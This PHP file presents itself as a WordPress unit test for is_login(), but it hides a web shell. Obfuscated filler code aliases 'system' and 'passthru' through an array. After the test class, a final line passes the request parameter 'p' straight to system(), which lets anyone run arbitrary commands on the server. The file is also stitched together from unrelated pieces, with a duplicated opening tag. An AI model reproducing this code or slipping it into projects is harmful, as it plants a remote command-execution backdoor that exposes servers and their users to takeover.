<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Tests for is_login().
 *
 * @group load
 *
 * @covers ::is_login
 */
class Tests_Load_IsLogin extends WP_UnitTestCase {

	/**
	 * @ticket 19898
	 */
	public function test_is_login() {
		$this->assertFalse( is_login() );

		$_SERVER['SCRIPT_NAME'] = '/wp-login.php';

		$this->assertTrue( is_login() );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>